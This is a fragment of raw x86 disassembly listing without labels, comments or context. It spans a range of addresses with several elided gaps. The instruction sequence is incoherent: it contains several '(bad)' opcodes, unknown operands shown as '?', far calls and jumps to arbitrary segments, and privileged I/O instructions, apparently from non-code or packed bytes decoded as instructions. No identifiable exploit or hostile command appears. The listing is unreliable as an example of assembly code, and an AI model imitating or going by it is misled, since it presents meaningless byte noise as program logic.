  41eb18:	sub    BYTE PTR [edi-0x43d3b78b],ch
  41eb1e:	pop    esp
  41eb1f:	sub    esi,DWORD PTR [edx]
  41eb21:	mov    eax,ds:0xa73a3954
  41eb26:	pop    edi
  41eb27:	cmp    cl,BYTE PTR [esi-0x76]
  41eb2a:	arpl   WORD PTR [edx],di
  41eb2c:	dec    ebp
  41eb2d:	shr    BYTE PTR [ebp+0x47],0x18
  41eb31:	shr    BYTE PTR [esp+eax*2+0x3a],0x8a
  41eb36:	addr16 sbb eax,0x1044aa1f
  41eb3c:	sub    al,0x5b
  41eb3e:	inc    edi
  41eb3f:	pop    es
  41eb40:	dec    ebp
  41eb41:	scas   eax,DWORD PTR es:[edi]
  41eb42:	pop    edi
  41eb43:	std    
  41eb44:	pop    ecx
  41eb45:	lahf   
  41eb46:	addr16 sti 
  41eb48:	adc    dh,BYTE PTR [edi]
  41eb4a:	sub    eax,DWORD PTR [ecx]
  41eb4c:	push   edi
  41eb4d:	mov    DWORD PTR [eax],0x5fc24d15
  41eb53:	sti    
  41eb54:	inc    ecx
  41eb55:	popf   
  41eb56:	push   esp
  41eb57:	mov    ecx,0xd75f9d3d
  41eb5c:	pop    eax
  41eb5d:	test   eax,0xac1edd67
  41eb62:	lds    ebx,FWORD PTR cs:[edx]
  41eb65:	scas   eax,DWORD PTR es:[edi]
  41eb66:	add    BYTE PTR [ecx-0x318b53e6],dh
	...
  41eb94:	add    BYTE PTR [eax],al
  41eb96:	dec    edi
  41eb97:	scas   al,BYTE PTR es:[edi]
  41eb98:	cs int 0x22
  41eb9b:	scas   eax,DWORD PTR es:[edi]
  41eb9c:	add    al,cl
  41eb9e:	xor    DWORD PTR [edi-0x7aeb748e],edi
  41eba4:	mov    BYTE PTR fs:[ecx],dh
  41eba7:	pop    ebx
  41eba8:	outs   dx,DWORD PTR ds:[esi]
  41eba9:	pushf  
  41ebaa:	push   0xffffffbc
  41ebac:	imul   edi,DWORD PTR [edi+0x749651],0x75546e97
  41ebb6:	and    eax,0xbb466b7c
  41ebbb:	push   0x0
  41ebbd:	push   ebx
  41ebbe:	adc    BYTE PTR [eax+0x74],bl
  41ebc1:	ja     0x41ebb9
  41ebc3:	dec    eax
  41ebc4:	popa   
  41ebc5:	pop    esp
  41ebc6:	dec    ebx
  41ebc7:	data16 jb 0x41ec2c
  41ebca:	add    BYTE PTR [ebp+0x54],dh
  41ebcd:	push   eax
  41ebce:	sub    DWORD PTR [bp+0x73],0x6c6c7a2b
  41ebd6:	daa    
  41ebd7:	jp     0x41ec4d
  41ebd9:	push   0x666b6b67
  41ebde:	or     ebp,DWORD PTR [eax+0x5d]
  41ebe1:	jb     0x41ec1d
  41ebe3:	jae    0x41ec34
  41ebe5:	outs   dx,DWORD PTR ds:[esi]
  41ebe6:	sub    edi,DWORD PTR [edx+0x5c]
  41ebe9:	inc    esi
  41ebea:	imul   esi,DWORD PTR [ebp+0x54],0x729b2750
  41ebf1:	cmp    edx,DWORD PTR gs:[esi+0x6e]
  41ebf5:	je     0x41ec45
  41ebf7:	jp     0x41ec65
  41ebf9:	push   ebx
	...
  41ec22:	add    BYTE PTR [eax],al
  41ec24:	inc    esi
  41ec25:	xor    DWORD PTR [eax+eax*1+0x64],0x49
  41ec2a:	popa   
  41ec2b:	fs cli 
  41ec2d:	jg     0x41eca3
  41ec2f:	imul   esi,esi,0xa683f7d
  41ec35:	jnp    0x41ec9e
  41ec37:	add    BYTE PTR [esi+edi*2+0x78a87466],dh
  41ec3e:	jb     0x41eca5
  41ec40:	ret    
  41ec41:	push   0x6b
  41ec43:	je     0x41ec4b
  41ec45:	outs   dx,BYTE PTR ds:[esi]
  41ec46:	inc    esi
  41ec47:	inc    esi
  41ec48:	cdq    
  41ec49:	test   DWORD PTR [eax+0x5c],edx
  41ec4c:	nop
  41ec4d:	dec    ecx
  41ec4e:	je     0x41ecb9
  41ec50:	mov    al,0x7f
  41ec52:	outs   dx,DWORD PTR ds:[esi]
  41ec53:	add    BYTE PTR [esi],bh
  41ec55:	hlt    
  41ec56:	and    DWORD PTR [ecx+0x2d],esi
  41ec59:	int    0x23
  41ec5b:	jb     0x41ec7f
  41ec5d:	inc    esp
  41ec5e:	cs jno 0x41ec7c
  41ec61:	mov    dl,0x43
  41ec63:	pop    edi
  41ec64:	sub    esp,edi
  41ec66:	add    BYTE PTR [eax+0x21],cl
  41ec69:	mov    cl,0xd
  41ec6b:	aas    
  41ec6c:	and    dl,BYTE PTR [edx-0x6113fff1]
  41ec72:	and    eax,0x40a6f26d
  41ec77:	addr16 in al,dx
  41ec79:	inc    ebx
  41ec7a:	xor    DWORD PTR [ebp-0x14],ebp
  41ec7d:	ja     0x41ec83
  41ec7f:	dec    eax
  41ec80:	shl    DWORD PTR [eax+0x10],1
  41ec83:	dec    esi
  41ec84:	fistp  WORD PTR [esi+0x1d]
	...
  41ecb2:	out    dx,al
  41ecb3:	je     0x41ecc7
  41ecb5:	je     0x41ecf5
  41ecb7:	ja     0x41ecc8
  41ecb9:	arpl   sp,cx
  41ecbb:	and    DWORD PTR gs:[ebx-0x5d],ebp
  41ecbf:	inc    edx
  41ecc0:	xor    DWORD PTR [edi-0x53],ebx
  41ecc3:	push   ecx
  41ecc4:	or     ebp,DWORD PTR [ebp-0x54]
  41ecc7:	data16 add al,0x48
  41ecca:	xchg   ecx,eax
  41eccb:	xor    DWORD PTR ds:0x4330a744,ecx
  41ecd1:	pop    edi
  41ecd2:	mov    ds:0x9951045f,eax
  41ecd7:	and    al,0xd
  41ecd9:	jne    0x41ec7a
  41ecdb:	adc    BYTE PTR [esi],bl
  41ecdd:	pop    esp
  41ecde:	jge    0x41ecfd
  41ece0:	sbb    esp,DWORD PTR [esi+0x5b]
  41ece3:	pop    ds
  41ece4:	inc    eax
  41ece5:	jae    0x41ed55
  41ece7:	bound  ebp,QWORD PTR [edi]
  41ece9:	ins    DWORD PTR es:[edi],dx
  41ecea:	pop    eax
  41eceb:	out    dx,al
  41ecec:	or     ebx,DWORD PTR [edi+0x4c]
  41ecef:	daa    
  41ecf0:	xor    eax,0x1dee6047
  41ecf5:	jb     0x41ed4f
  41ecf7:	pop    ebx
  41ecf8:	mov    WORD PTR [edi],cs
  41ecfa:	bound  ecx,QWORD PTR [ebx-0x3ddfdb67]
  41ed00:	sbb    DWORD PTR [esi],0x2f
  41ed03:	pop    ebx
  41ed04:	mov    edx,0x7eaf2024
  41ed09:	and    ch,BYTE PTR [esi+edi*4]
  41ed0c:	fwait
  41ed0d:	cmp    eax,0x229e8af2
  41ed12:	or     al,0xbe
  41ed14:	mov    eax,DWORD PTR [eax+0x0]
	...
  41ed3f:	add    bl,bh
  41ed41:	mov    BYTE PTR [edx+ecx*2],ch
  41ed44:	jmp    0x4cae:0xe1373b8a
  41ed4b:	pop    ss
  41ed4c:	mov    ds:0x5af2173e,eax
  41ed52:	sbb    al,0x17
  41ed54:	(bad)  [eax-0x5714cc19]
  41ed5a:	cmp    eax,DWORD PTR [esi+ebp*8]
  41ed5d:	mov    esp,edi
  41ed5f:	xor    edx,edx
  41ed61:	ret    0x439
  41ed64:	out    dx,eax
  41ed65:	xchg   DWORD PTR [edi],ebp
  41ed67:	add    al,0xae
  41ed69:	test   eax,0xc7992a06
  41ed6e:	add    al,0x17
  41ed70:	pop    eax
  41ed71:	mov    bl,0x14
  41ed73:	and    BYTE PTR [esi],bh
  41ed75:	xchg   edi,eax
  41ed76:	and    eax,0x2c7b6e38
  41ed7b:	or     al,0x8e
  41ed7d:	(bad)  
  41ed7e:	(bad)  
  41ed7f:	adc    eax,0x36e7a99d
  41ed84:	xchg   ebx,eax
  41ed85:	mov    ebp,0xa9991ad3
  41ed8a:	int3   
  41ed8b:	das    
  41ed8c:	js     0x41ed1d
  41ed8e:	mov    bh,0xe3
  41ed90:	jl     0x41ed45
  41ed92:	mov    bh,0x1f
  41ed94:	push   ebx
  41ed95:	test   eax,0x9d7a15c4
  41ed9a:	add    BYTE PTR [ebp-0x4ebc84f3],bl
  41eda0:	sub    eax,0x9b6dc7
	...
  41edcd:	add    BYTE PTR [esi],dl
  41edcf:	test   eax,0xa95cb65c
  41edd4:	imul   ebx,DWORD PTR [edx-0x7b9e6bb3],0xaa46a059
  41edde:	imul   eax,esi,0x94038d6d
  41ede4:	jb     0x41edaa
  41ede6:	imul   ebp,DWORD PTR [ecx+0x34],0xffffffe9
  41edea:	add    ebp,DWORD PTR [eax-0x3aa2a28c]
  41edf0:	jno    0x41eddb
  41edf2:	xor    dh,al
  41edf4:	pop    bp
  41edf6:	push   ebp
  41edf7:	xchg   esp,eax
  41edf8:	jb     0x41ee3e
  41edfa:	cs popf 
  41edfc:	push   esp
  41edfd:	sbb    DWORD PTR [edx-0x68],ebx
  41ee00:	js     0x41ee3b
  41ee02:	push   ds
  41ee03:	(bad)  
  41ee04:	jb     0x41ee52
  41ee06:	sub    BYTE PTR [edi-0x42e2c4b0],dl
  41ee0c:	addr16 adc eax,0x3900aa17
  41ee12:	arpl   WORD PTR [ecx+esi*2+0x64ad5d1e],bp
  41ee19:	jmp    0xfab3808b
  41ee1e:	inc    esp
  41ee1f:	shl    BYTE PTR [edx+0x5],0x56
  41ee23:	stos   BYTE PTR es:[edi],al
  41ee24:	jo     0x41ee32
  41ee26:	cmp    ah,BYTE PTR [ebx+0x5b31fa6d]
  41ee2c:	dec    esp
  41ee2d:	(bad)  
  41ee2e:	push   esp
  41ee2f:	mov    edx,0xe96e
	...
  41ee5c:	sub    eax,0x3ddd72c0
  41ee61:	call   0x5f:0xba51c06e
  41ee68:	or     ebp,DWORD PTR [edi+0x5d]
  41ee6b:	je     0x41ee5c
  41ee6d:	pop    esi
  41ee6e:	inc    esi
  41ee6f:	je     0x41ee08
  41ee71:	imul   esp,DWORD PTR [ebp+0x74],0x6d753d02
  41ee78:	stos   DWORD PTR es:[edi],eax
  41ee79:	pop    esi
  41ee7a:	pop    esp
  41ee7b:	inc    esi
  41ee7c:	aad    0x4f
  41ee7e:	arpl   WORD PTR [ecx-0x2d],sp
  41ee81:	sub    DWORD PTR [edi],0x0
  41ee84:	jmp    0x97ab5cd8
  41ee89:	adc    BYTE PTR [esi+0x61],0xc9
  41ee8d:	call   0x6f3f:0x82c26b75
  41ee94:	or     DWORD PTR [ebp+eiz*2+0x6167fb67],eax
  41ee9b:	jae    0x41eeb1
  41ee9d:	push   esi
  41ee9e:	imul   ebp,DWORD PTR [esi+0x14],0x57
  41eea2:	pop    esp
  41eea3:	push   ebx
  41eea4:	add    cl,BYTE PTR [eax+0x6f]
  41eea7:	imul   ecx,DWORD PTR [eax],0x34006f7d
  41eead:	jl     0x41ef15
  41eeaf:	je     0x41eec1
  41eeb1:	jle    0x41ef25
  41eeb3:	cmp    esi,DWORD PTR gs:[ebp+0x5d]
  41eeb7:	outs   dx,BYTE PTR ds:[esi]
  41eeb8:	adc    esp,DWORD PTR [esi+0x67]
  41eebb:	gs jnp 0x41ef26
  41eebe:	popa   
  41eebf:	arpl   WORD PTR [eax],ax
	...
  41eee9:	add    BYTE PTR [edx+0x49],dl
  41eeec:	popa   
  41eeed:	inc    esi
  41eeee:	outs   dx,DWORD PTR ds:[esi]
  41eeef:	push   edi
  41eef0:	aas    
  41eef1:	outs   dx,DWORD PTR ds:[esi]
  41eef2:	dec    ecx
  41eef3:	test   DWORD PTR [ebp+0x67],esp
  41eef6:	pop    es
  41eef7:	outs   dx,BYTE PTR ds:[esi]
  41eef8:	pop    ebp
  41eef9:	je     0x41ef3a
  41eefb:	push   edi
  41eefc:	push   ecx
  41eefd:	ins    BYTE PTR es:[edi],dx
  41eefe:	adc    ecx,DWORD PTR [eax+0x5d]
  41ef01:	inc    esi
  41ef02:	jmp    FWORD PTR [ebp+0x0]
  41ef05:	pop    esp
  41ef06:	adc    al,0x55
  41ef08:	je     0x41ef6f
  41ef0a:	ds adc eax,0xf05b77df
  41ef10:	add    BYTE PTR [eax+edi*2-0x30],bl
  41ef14:	xor    BYTE PTR [edx+0x53],dl
  41ef17:	cmc    
  41ef18:	sbb    BYTE PTR [eax],al
  41ef1a:	ins    BYTE PTR es:[edi],dx
  41ef1b:	out    dx,eax
  41ef1c:	adc    ebp,DWORD PTR [eax+0x6d]
  41ef1f:	sbb    edx,DWORD PTR ds:0x1dfc1063
  41ef25:	ins    BYTE PTR es:[edi],dx
  41ef26:	ds cmc 
  41ef28:	and    eax,0x12df2872
  41ef2d:	add    BYTE PTR [ebx],dl
  41ef2f:	aad    0x25
  41ef31:	jb     0x41ef43
  41ef33:	jecxz  0x41ef52
  41ef35:	arpl   WORD PTR [esi],di
  41ef37:	aam    0x21
  41ef39:	jno    0x41ef48
  41ef3b:	mov    cl,0x20
  41ef3d:	jb     0x41ef61
  41ef3f:	inc    esp
  41ef40:	inc    edi
  41ef41:	je     0x41ef51
  41ef43:	je     0x41ef64
  41ef45:	jb     0x41ef39
  41ef47:	inc    ebx
  41ef48:	xor    al,0x6d
  41ef4a:	fmul   DWORD PTR [edi+0x5f17]
	...
  41ef78:	in     al,dx
  41ef79:	xchg   esi,eax
  41ef7a:	xor    BYTE PTR [ecx-0x14],al
  41ef7d:	call   0x6225:0x48fa7225
  41ef84:	in     eax,dx
  41ef85:	call   0x6c26:0x66ee6318
  41ef8c:	xlat   BYTE PTR ds:[ebx]
  41ef8d:	push   esp
  41ef8e:	sbb    al,0x63
  41ef90:	lods   al,BYTE PTR ds:[esi]
  41ef91:	inc    edx
  41ef92:	sub    eax,0x3b4ea742
  41ef97:	addr16 cwde 
  41ef99:	push   edi
  41ef9a:	or     al,0x0
  41ef9c:	pushf  
  41ef9d:	dec    ebx
  41ef9e:	sbb    BYTE PTR [ecx-0x59],ch
  41efa1:	pusha  
  41efa2:	and    eax,0x135e6078
  41efa7:	add    BYTE PTR [esi+0x31],dh
  41efaa:	adc    al,0x74
  41efac:	nop
  41efad:	pop    ebx
  41efae:	enter  0x5d1e,0x5b
  41efb2:	mov    ah,0x14
  41efb4:	pop    ebp
  41efb5:	lods   eax,DWORD PTR ds:[esi]
  41efb6:	lds    esp,FWORD PTR [edx]
  41efb8:	push   ebp
  41efb9:	mov    dh,0xe7
  41efbb:	xor    eax,DWORD PTR [ecx+0x6b18baac]
  41efc1:	lods   eax,DWORD PTR ds:[esi]
  41efc2:	ret    
  41efc3:	add    ebp,DWORD PTR [esi-0x40]
  41efc6:	mov    ecx,0xbe8c3e17
  41efcb:	sub    DWORD PTR [edx-0x58],ecx
  41efce:	mov    BYTE PTR ds:0xba48f1d,dl
  41efd4:	cs mov edx,0xc22c4785
  41efda:	xchg   ebp,eax
  41efdb:	add    BYTE PTR es:[eax],al
	...
  41f006:	add    cl,BYTE PTR [esp+ecx*4-0x713df0ec]
  41f00d:	and    DWORD PTR [edi],ecx
  41f00f:	pop    ebx
  41f010:	xchg   ebx,eax
  41f011:	inc    esi
  41f012:	push   es
  41f013:	stos   DWORD PTR es:[edi],eax
  41f014:	mov    BYTE PTR [ecx],ah
  41f016:	cli    
  41f017:	lods   al,BYTE PTR ds:[esi]
  41f018:	push   eax
  41f019:	push   ss
  41f01a:	fstp   QWORD PTR [edx+0x3b]
  41f01d:	sub    ah,ch
  41f01f:	rcr    DWORD PTR [ebp+0x29],0xef
  41f023:	add    BYTE PTR [ecx+0x13],0x3e
  41f027:	jge    0x41f060
  41f029:	and    eax,0x1f36abcf
  41f02e:	int3   
  41f02f:	mov    dh,0x9
  41f031:	in     al,0x7
  41f033:	jnp    0x41f03e
  41f035:	add    al,0x1c
  41f037:	jg     0x41f020
  41f039:	xor    ch,BYTE PTR [ebx-0x6ee8ec47]
  41f03f:	lods   eax,DWORD PTR ds:[esi]
  41f040:	or     al,0x30
  41f042:	jge    0x41eff7
  41f044:	pop    ss
  41f045:	and    eax,0x1cf99790
  41f04a:	nop
  41f04b:	mov    dh,0xe7
  41f04d:	dec    eax
  41f04e:	xchg   esi,eax
  41f04f:	stos   DWORD PTR es:[edi],eax
  41f050:	add    BYTE PTR [eax],cl
  41f052:	sub    BYTE PTR [edi-0x43d7ff8e],dl
  41f058:	pop    ebp
  41f059:	mov    cl,0x58
  41f05b:	les    esp,FWORD PTR [ebx-0x17]
  41f05e:	sub    al,0xbc
  41f060:	jb     0x41f041
  41f062:	push   ss
  41f063:	lods   eax,DWORD PTR ds:[esi]
  41f064:	add    BYTE PTR [esp+ecx*2+0xb772bc],dh
	...
  41f093:	add    BYTE PTR [edx],ah
  41f095:	les    esp,FWORD PTR [ebx-0x17]
  41f098:	or     eax,0x30ba7190
  41f09d:	mov    esi,0x8e3dc572
  41f0a2:	push   eax
  41f0a3:	mov    BYTE PTR [edx+ebp*4+0x75],cl
  41f0a7:	mov    cs,WORD PTR [edi-0x49]
  41f0aa:	add    BYTE PTR [ebp-0x759c52b6],ch
  41f0b0:	dec    ecx
  41f0b1:	mov    esi,0x8a3d8072
  41f0b6:	ins    DWORD PTR es:[edi],dx
  41f0b7:	xchg   DWORD PTR [ecx],ebp
  41f0b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0ba:	pop    edi
  41f0bb:	jnp    0x41f113
  41f0bd:	(bad)  
  41f0be:	dec    esi
  41f0bf:	stos   BYTE PTR es:[edi],al
  41f0c0:	inc    ebp
  41f0c1:	jnp    0x41f114
  41f0c3:	push   esi
  41f0c4:	and    BYTE PTR [edi-0x43b3b78b],ah
  41f0ca:	pop    esp
  41f0cb:	sub    bl,BYTE PTR [esi]
  41f0cd:	nop
  41f0ce:	jno    0x41f12a
  41f0d0:	inc    ebx
  41f0d1:	mov    edx,0x8f121d46
  41f0d6:	inc    esi
  41f0d7:	adc    eax,0x4a61700a
  41f0dc:	sub    DWORD PTR [esi+ebp*2+0x465b2d35],ebp
  41f0e3:	sbb    eax,0x1b638c52
  41f0e8:	dec    eax
  41f0e9:	mov    edx,0xa783e972
  41f0ee:	jo     0x41f124
  41f0f0:	dec    ebp
  41f0f1:	mov    edx,0x78510072
  41f0f6:	imul   esp,DWORD PTR [ebp+0x0],0x0
	...
  41f121:	add    BYTE PTR [edi],ah
  41f123:	cdq    
  41f124:	je     0x41f196
  41f126:	daa    
  41f127:	js     0x41f198
  41f129:	jae    0x41f133
  41f12b:	dec    esi
  41f12c:	jb     0x41f192
  41f12e:	out    0x7d,eax
  41f130:	inc    esi
  41f131:	je     0x41f14a
  41f133:	imul   ebx,DWORD PTR [ebp+0x73],0x4
  41f137:	inc    esi
  41f138:	imul   esi,DWORD PTR [edx-0x5],0x5a
  41f13c:	inc    esi
  41f13d:	je     0x41f0d6
  41f13f:	xchg   esi,eax
  41f140:	gs jb  0x41f13d
  41f143:	jns    0x41f1b9
  41f145:	outs   dx,DWORD PTR ds:[esi]
  41f146:	test   DWORD PTR [edi+0x0],ebx
  41f149:	push   ebx
  41f14a:	mov    al,ds:0xe6575498
  41f14f:	ins    BYTE PTR es:[edi],dx
  41f150:	inc    ecx
  41f151:	pop    esp
  41f152:	loope  0x41f0ed
  41f154:	dec    eax
  41f155:	and    ah,ah
  41f157:	dec    ebp
  41f158:	data16 je 0x41f123
  41f15b:	ja     0x41f1cf
  41f15d:	gs jecxz 0x41f0f8
  41f160:	ins    BYTE PTR es:[edi],dx
  41f161:	imul   eax,ecx,0xb4415c75
  41f167:	jns    0x41f1d4
  41f169:	jne    0x41f16c
  41f16b:	inc    esi
  41f16c:	outs   dx,DWORD PTR ds:[esi]
  41f16d:	add    BYTE PTR [eax+edx*2],dh
  41f170:	data16 je 0x41f17b
  41f173:	jp     0x41f1e7
  41f175:	xor    edx,DWORD PTR gs:[ebp+0x7b145054]
  41f17c:	gs gs icebp 
  41f17f:	push   edx
  41f180:	pop    esp
  41f181:	push   ebx
  41f182:	out    dx,al
  41f183:	push   edx
  41f184:	popa   
  41f185:	jae    0x41f187
	...
  41f1af:	add    BYTE PTR [edi+0x6b],dl
  41f1b2:	imul   esp,DWORD PTR [esi+0xb],0x48
  41f1b6:	pop    ebp
  41f1b7:	jb     0x41f203
  41f1b9:	imul   ecx,DWORD PTR [edi+0x6f],0x39
  41f1bd:	push   ebx
  41f1be:	pop    eax
  41f1bf:	cs ds push ebp
  41f1c2:	adc    ah,BYTE PTR [ebp-0x7e]
  41f1c5:	jbe    0x41f1ff
  41f1c7:	push   eax
  41f1c8:	jge    0x41f212
  41f1ca:	sbb    DWORD PTR [ebx-0x60],esp
  41f1cd:	sub    BYTE PTR ds:0x26309751,ch
  41f1d3:	jno    0x41f213
  41f1d5:	out    dx,al
  41f1d6:	sbb    edi,DWORD PTR [eax+0x5d]
  41f1d9:	inc    esp
  41f1da:	fld    TBYTE PTR [edx+eiz*2+0x20]
  41f1de:	add    DWORD PTR [esi+0x72],esp
  41f1e1:	adc    al,0x1d
  41f1e3:	pop    edi
  41f1e4:	ins    DWORD PTR es:[edi],dx
  41f1e5:	or     bl,bl
  41f1e7:	ins    BYTE PTR es:[edi],dx
  41f1e8:	dec    ebp
  41f1e9:	and    BYTE PTR [ecx],al
  41f1eb:	pop    esp
  41f1ec:	jns    0x41f1c2
  41f1ee:	das    
  41f1ef:	ins    DWORD PTR es:[edi],dx
  41f1f0:	pusha  
  41f1f1:	lock adc ebx,DWORD PTR [edi+0x4c]
  41f1f5:	pop    ss
  41f1f6:	sub    eax,0x25d22744
  41f1fb:	popa   
  41f1fc:	sub    bl,ch
  41f1fe:	push   cs
  41f1ff:	ja     0x41f25f
  41f201:	cmc    
  41f202:	adc    BYTE PTR [ebx+0x2d],dh
  41f205:	inc    esp
  41f206:	sub    eax,0xee32651
  41f20b:	arpl   WORD PTR [edx],bx
  41f20d:	shl    DWORD PTR ds:0x1adb1274,1
  41f213:	add    BYTE PTR gs:[eax],al
	...
  41f23e:	or     eax,0xed611fee
  41f243:	inc    ebx
  41f244:	sub    eax,0x12a2e651
  41f249:	arpl   dx,sp
  41f24b:	jo     0x41f272
  41f24d:	je     0x41f239
  41f24f:	call   0x5cd1:0x74cd651e
  41f256:	push   cs
  41f257:	dec    ebp
  41f258:	aad    0x2d
  41f25a:	frstor [eax+0x50e2000f]
  41f260:	sbb    al,0x5f
  41f262:	lods   al,BYTE PTR ds:[esi]
  41f263:	pop    ebx
  41f264:	or     al,0x28
  41f266:	(bad)  
  41f267:	mov    dh,0x13
  41f269:	sbb    BYTE PTR [ecx+0x50110ebd],ah
  41f26f:	test   al,0x18
  41f271:	and    BYTE PTR [ecx+0x72040ca7],ah
  41f277:	mov    BYTE PTR [edi],cl
  41f279:	and    ecx,DWORD PTR [esi+esi*4-0x5862cef5]
  41f280:	repz sbb ch,BYTE PTR [eax-0x4c]
  41f284:	fisubr DWORD PTR [ecx+eiz*1]
  41f287:	mov    WORD PTR [edi],ss
  41f289:	sub    eax,0x12da7d2d
  41f28e:	push   edx
  41f28f:	ret    0x26d3
  41f292:	(bad)
  41f297:	mov    ch,0xc4
  41f299:	es jg  0x41f242
  41f29c:	mov    bh,0xe3
  41f29e:	outs   dx,BYTE PTR ds:[esi]
  41f29f:	mov    esp,0x17c5
	...
  41f2cc:	xor    edi,DWORD PTR [edx-0x40c1d967]
  41f2d2:	test   BYTE PTR [edx],ah
  41f2d4:	cs mov ch,0x9b
  41f2d7:	adc    edi,DWORD PTR [esi]
  41f2d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2da:	jge    0x41f2fb
  41f2dc:	sbb    eax,0x1cdd77ba
  41f2e1:	mov    bl,0x84
  41f2e3:	add    ecx,DWORD PTR [edi]
  41f2e5:	ret    0x267b
  41f2e8:	(bad)  
  41f2ea:	and    DWORD PTR [edx],0xfffffff2
  41f2ed:	pop    edx
  41f2ee:	pop    edx
  41f2ef:	sbb    eax,0xda5ab5ea
  41f2f4:	loopne 0x41f2b2
  41f2f6:	inc    eax
  41f2f7:	add    al,0x2
  41f2f9:	lahf   
  41f2fa:	inc    esp
  41f2fb:	and    eax,0x164883ce
  41f300:	fisttp QWORD PTR [esi-0x5516ded5]
  41f306:	add    BYTE PTR [edi],ch
  41f308:	push   cs
  41f309:	mov    eax,DWORD PTR [eax]
  41f30b:	sbb    dh,BYTE PTR [ebp-0x6b]
  41f30e:	push   esp
  41f30f:	ds jnp 0x41f29b
  41f312:	inc    ebx
  41f313:	cmp    eax,0x195fb866
  41f318:	ins    DWORD PTR es:[edi],dx
  41f319:	mov    WORD PTR [edx+0x4],?
  41f31c:	inc    edx
  41f31d:	xchg   esp,eax
  41f31e:	outs   dx,BYTE PTR ds:[esi]
  41f31f:	cli    
  41f320:	inc    ecx
  41f321:	mov    WORD PTR [ebp+ecx*1+0x52],gs
  41f325:	mov    WORD PTR [ecx+eax*1+0x3a],?
  41f329:	xchg   edi,eax
  41f32a:	pop    edi
  41f32b:	cmc    
  41f32c:	and    dl,BYTE PTR [edi+0xdb67]
	...
  41f35a:	cmp    eax,0x50da5f8b
  41f35f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f360:	ins    DWORD PTR es:[edi],dx
  41f361:	fild   DWORD PTR [ecx+0x5b]
  41f364:	dec    eax
  41f365:	mov    esi,0xc84ea730
  41f36a:	ss mov eax,0xb8309400
  41f370:	jb     0x41f319
  41f372:	sbb    al,al
  41f374:	arpl   cx,bp
  41f376:	jae    0x41f330
  41f378:	imul   edx,DWORD PTR [esi-0x6fbb47bf],0x53
  41f37f:	mov    eax,0xa9449d61
  41f384:	ja     0x41f36f
  41f386:	dec    ebp
  41f387:	mov    esi,0xa8577d72
  41f38c:	imul   ecx,DWORD PTR [ebx-0x50ff56a2],0x48
  41f393:	mov    esi,DWORD PTR [edx+0x7e]
  41f396:	dec    ecx
  41f397:	mov    esi,0x5b565661
  41f39c:	push   ecx
  41f39d:	dec    esi
  41f39e:	sbb    al,0xa7
  41f3a0:	jne    0x41f3ea
  41f3a2:	dec    eax
  41f3a3:	mov    eax,0xa9231c5c
  41f3a8:	je     0x41f3aa
  41f3aa:	out    dx,al
  41f3ab:	push   eax
  41f3ac:	and    BYTE PTR [eax+0x5],dl
  41f3af:	dec    esi
  41f3b0:	addr16 jb 0x41f3c1
  41f3b3:	push   ebx
  41f3b4:	add    BYTE PTR [esp+esi*1+0x11],bl
  41f3b8:	aas    
  41f3b9:	imul   edx,DWORD PTR [ebx-0x63],0x7074
	...
  41f3e8:	stc    
  41f3e9:	inc    edi
  41f3ea:	outs   dx,BYTE PTR ds:[esi]
  41f3eb:	imul   edx,DWORD PTR [edi],0x3e534465
  41f3f1:	dec    ebx
  41f3f2:	popa   
  41f3f3:	jae    0x41f3de
  41f3f5:	inc    edi
  41f3f6:	outs   dx,BYTE PTR ds:[esi]
  41f3f7:	imul   edx,DWORD PTR [edi],0x3654e83
  41f3fd:	imul   esi,DWORD PTR [edx+0x69],0xfffffff1
  41f401:	jnp    0x41f403
  41f403:	push   eax
  41f404:	push   es
  41f405:	push   edx
  41f406:	outs   dx,DWORD PTR ds:[esi]
  41f407:	push   edi
  41f408:	clc    
  41f409:	push   eax
  41f40a:	add    BYTE PTR fs:[edx-0x6dff93b0],ah
  41f411:	push   ecx
  41f412:	popa   
  41f413:	jb     0x41f39e
  41f415:	jg     0x41f480
  41f417:	xlat   BYTE PTR gs:[ebx]
  41f419:	jo     0x41f486
  41f41b:	outs   dx,DWORD PTR ds:[esi]
  41f41c:	sub    DWORD PTR [edx+0x65],0x72
  41f420:	add    BYTE PTR [ecx+0x57d56f74],0x0
  41f427:	push   eax
  41f428:	mov    eax,0xe4007450
  41f42d:	inc    ebp
  41f42e:	data16 je 0x41f3e1
  41f431:	jg     0x41f4a5
  41f433:	(bad)  gs:[ecx+0x6b]
  41f437:	jne    0x41f44c
  41f439:	inc    esi
  41f43a:	and    BYTE PTR [edx-0x42],dl
  41f43d:	dec    esp
  41f43e:	popa   
  41f43f:	jb     0x41f3c8
  41f441:	jp     0x41f4a4
  41f443:	arpl   WORD PTR [edi],cx
  41f445:	inc    ebp
  41f446:	imul   ebp,DWORD PTR [eax+edi*8+0x7b],0x65
  41f44b:	add    BYTE PTR gs:[eax],al
	...
  41f476:	test   DWORD PTR ds:[eax],ebp
  41f479:	push   ebp
  41f47a:	jecxz  0x41f411
  41f47c:	inc    eax
  41f47d:	jb     0x41f466
  41f47f:	imul   ebx,DWORD PTR ds:0x1a98fd5c,0x1094db6e
  41f489:	addr16 test eax,0x8d00136a
  41f48f:	push   edi
  41f490:	push   ss
  41f491:	jbe    0x41f436
  41f493:	inc    esi
  41f494:	xor    BYTE PTR [edi-0x52],dh
  41f497:	push   edi
  41f498:	add    al,0x46
  41f49a:	jb     0x41f500
  41f49c:	in     al,0x40
  41f49e:	xor    DWORD PTR [edx+0x30],0x4787952
  41f4a5:	inc    esi
  41f4a6:	push   0x44
  41f4a8:	inc    ebx
  41f4a9:	dec    ebp
  41f4aa:	mov    BYTE PTR [edi+edx*8],dh
  41f4ad:	outs   dx,DWORD PTR ds:[esi]
  41f4ae:	ins    BYTE PTR es:[edi],dx
  41f4af:	sbb    al,BYTE PTR [ecx]
  41f4b1:	pop    esp
  41f4b2:	mov    es,WORD PTR [esi]
  41f4b4:	sbb    BYTE PTR [esi+0x57],ah
  41f4b7:	and    BYTE PTR [esi],bl
  41f4b9:	jno    0x41f4f9
  41f4bb:	mov    ch,0x5
  41f4bd:	cld    
  41f4be:	inc    ecx
  41f4bf:	mov    dl,0x53
  41f4c1:	call   0xfd99da1d
  41f4c6:	push   esi
  41f4c7:	call   0x29b664d8
  41f4cc:	fdivr  st,st(7)
  41f4ce:	sbb    eax,ecx
  41f4d0:	or     al,0x70
  41f4d2:	sub    eax,0x3e2cd83e
  41f4d7:	fimul  DWORD PTR [eax+esi*2]
	...
  41f502:	add    BYTE PTR [eax],al
  41f504:	push   esp
